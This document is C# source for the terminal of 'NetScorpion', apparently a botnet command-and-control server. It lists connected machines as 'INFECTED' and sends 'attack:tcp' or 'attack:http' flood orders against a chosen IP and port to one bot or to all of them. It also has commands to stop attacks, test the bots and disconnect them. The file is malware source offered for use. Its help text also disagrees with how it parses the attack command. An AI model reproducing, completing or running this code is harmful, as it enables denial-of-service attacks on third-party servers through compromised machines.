using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WatsonTcp;
using NetScorpion.Common;
using System.IO;

namespace NetScorpion_Server
{
    public class Terminal
    {
        public static string terminalStr = "netscorpion";
        public static string version = "1.0";

        public static void Start()
        {
            Network.server = new WatsonTcpServer(Tools.readConfig("ip"), Convert.ToInt32(Tools.readConfig("port")));
            Network.setEvents();

            getcommand:

            writeStart();

            string command = Console.ReadLine();
            handleCommand(command);

            goto getcommand;
        }

        public static void writeStart()
        {
            ConsoleColor currentColor = Console.ForegroundColor;

            Console.Write("[Clients: ");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write(Network.server.ListClients().Count().ToString());
            Console.ForegroundColor = currentColor;
            Console.Write("]");
            Console.Write(" " + terminalStr + " ");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write(version);
            Console.ForegroundColor = currentColor;
            Console.Write(" $ ");
        }

        public static void handleCommand(string command)
        {
            if (command.Trim() == "help")
            {
                Console.WriteLine($"NetScorpion Server Terminal {version} help");
                Console.WriteLine("");
                Console.WriteLine("listen start                            Opens a listening port and starts listening for incomming connections.");
                Console.WriteLine("listen stop                             Opens a listening port and starts listening for incomming connections.");
                Console.WriteLine("stop                                    Stops the server.");
                Console.WriteLine("list client                             Shows a list for all connected clients.");
                Console.WriteLine("help                                    Shows this message");
                Console.WriteLine("attack start <ip> <port> <client/all>   Starts a TCP attack for all connected clients ('list client')");
                Console.WriteLine("attack stop                             Stops current attack.");
                Console.WriteLine("test connection                         Tests all connections.");
                Console.WriteLine("options list                            Shows a list for all options (e.g. port, ip)");
                Console.WriteLine("set <option> <value>                    Sets a global option. (e.g. 'set port 1234', 'set ip 127.0.0.1')");
                Console.WriteLine("disconnect <ip:port/all>                Disconnects specified client.");
            }
            else if (command.Trim().StartsWith("listen"))
            {
                if (command.Trim() == "listen start")
                {
                    if (!Network.server.IsListening)
                    {
                        Network.server.Start();

                        Console.WriteLine("Server is listening on port " + Tools.readConfig("port"));
                    }
                    else
                    {
                        Console.WriteLine("Server already running on port " + Tools.readConfig("port"));
                    }
                }
                else if (command.Trim() == "listen stop")
                {
                    if (Network.server.IsListening)
                    {
                        Network.server.Stop();
                        Network.server.DisconnectClients();

                        Console.WriteLine("Server stopped successfully.");
                    }
                    else
                    {
                        Console.WriteLine("Server isn't running.");
                    }
                }
                else
                {
                    Console.WriteLine($"NetScorpion Server Terminal {version} listen");
                    Console.WriteLine("");
                    Console.WriteLine("listen start                            Opens a listening port and starts listening for incomming connections.");
                    Console.WriteLine("listen stop                             Opens a listening port and starts listening for incomming connections.");
                }
            }
            else if (command.Trim() == "stop")
            {
                if (Network.server.IsListening)
                {
                    Network.server.Stop();
                    Network.server.DisconnectClients();

                    Console.WriteLine("Server stopped successfully.");
                }
                else
                {
                    Console.WriteLine("Server isn't running.");
                }
            }
            else if (command.Trim().StartsWith("list"))
            {
                if (command.Trim() == "list client")
                {
                    if (Network.server.IsListening)
                    {
                        Console.WriteLine("Connected Clients:");
                        Console.WriteLine();

                        foreach (string client in Network.server.ListClients())
                        {
                            ConsoleColor currentColor = Console.ForegroundColor;

                            Console.Write("[");
                            Console.ForegroundColor = ConsoleColor.Blue;
                            Console.Write("CLIENT");
                            Console.ForegroundColor = currentColor;
                            Console.Write("]");
                            Console.Write(" ");
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.Write("INFECTED");
                            Console.ForegroundColor = currentColor;
                            Console.Write(" ");
                            Console.WriteLine(client);
                        }
                    }
                    else
                    {
                        Console.WriteLine("Server isn't running.");
                    }
                }
                else
                {
                    Console.WriteLine($"NetScorpion Server Terminal {version} list");
                    Console.WriteLine("");
                    Console.WriteLine("list client                             Shows a list for all connected clients.");
                }
            }
            else if (command.Trim().StartsWith("attack"))
            {
                if(command.Trim().StartsWith("attack start"))
                {
                    string[] parts = command.Trim().Split(' '); // attach start 127.0.0.1 80 tcp all

                    if (parts[4] == "tcp")
                    {
                        Console.WriteLine("Sending attack requests to clients...");

                        Dictionary<object, object> metaData = new Dictionary<object, object>();

                        metaData.Add(parts[2], parts[3]);

                        if (parts[5] == "all")
                        {
                            foreach (string client in Network.server.ListClients())
                            {
                                Network.server.Send(client, "attack:tcp", metaData);
                            }

                            Console.WriteLine("Attack started!");
                        }
                        else
                        {
                            Network.server.Send(parts[5], "attack:tcp", metaData);

                            Console.WriteLine("Attack started!");
                        }
                    }
                    if (parts[4] == "http")
                    {
                        Console.WriteLine("Sending attack requests to clients...");

                        Dictionary<object, object> metaData = new Dictionary<object, object>();

                        metaData.Add(parts[2], parts[3]);

                        if (parts[5] == "all")
                        {
                            foreach (string client in Network.server.ListClients())
                            {
                                Network.server.Send(client, "attack:http", metaData);
                            }

                            Console.WriteLine("Attack started!");
                        }
                        else
                        {
                            Network.server.Send(parts[5], "attack:http", metaData);

                            Console.WriteLine("Attack started!");
                        }
                    }
                }
                else if (command.Trim().StartsWith("attack stop"))
                {
                    Console.WriteLine("Sending stop requests to clients...");

                    foreach (string client in Network.server.ListClients())
                    {
                        Network.server.Send(client, "stop");
                    }

                    Console.WriteLine("Attack stopped.");
                }
                else
                {
                    Console.WriteLine($"NetScorpion Server Terminal {version} attack");
                    Console.WriteLine("");
                    Console.WriteLine("attack start <ip> <port> <client/all>   Starts a TCP attack for all connected clients ('list client')");
                    Console.WriteLine("attack stop                             Stops current attack.");
                }
            }
            else if (command.Trim().StartsWith("test"))
            {
                if (command.Trim().StartsWith("test connection"))
                {
                    Console.WriteLine("Sending test requests to clients...");

                    foreach (string client in Network.server.ListClients())
                    {
                        Network.server.Send(client, "test");
                    }
                }
                else
                {
                    Console.WriteLine($"NetScorpion Server Terminal {version} test");
                    Console.WriteLine("");
                    Console.WriteLine("test connection                         Tests all connections.");
                }
            }
            else if (command.Trim().StartsWith("options"))
            {
                if (command.Trim().StartsWith("options list"))
                {
                    Console.WriteLine("Global Options:");
                    Console.WriteLine();

                    foreach (string option in File.ReadAllLines("config.ini"))
                    {
                        Console.WriteLine(option.Replace(":", " "));
                    }
                }
                else
                {
                    Console.WriteLine($"NetScorpion Server Terminal {version} options");
                    Console.WriteLine("");
                    Console.WriteLine("options list                            Shows a list for all options (e.g. port, ip)");
                }
            }
            else if (command.Trim().StartsWith("set"))
            {
                Tools.writeConfig(command.Trim().Split(' ')[1], command.Trim().Split(' ')[2]);
            }
            else if (command.Trim().StartsWith("disconnect"))
            {
                string[] parts = command.Trim().Split(' ');

                if (parts[1] == "all")
                {
                    Network.server.DisconnectClients();
                }
                else
                {
                    Network.server.DisconnectClient(parts[1]);
                }
            }
            else
            {
                if (command.Trim() != "")
                {
                    Console.WriteLine("Command not found. Enter 'help' to show command list.");
                }
            }

            if (command.Trim() != "")
            {
                Console.WriteLine();
            }
        }
    }
}
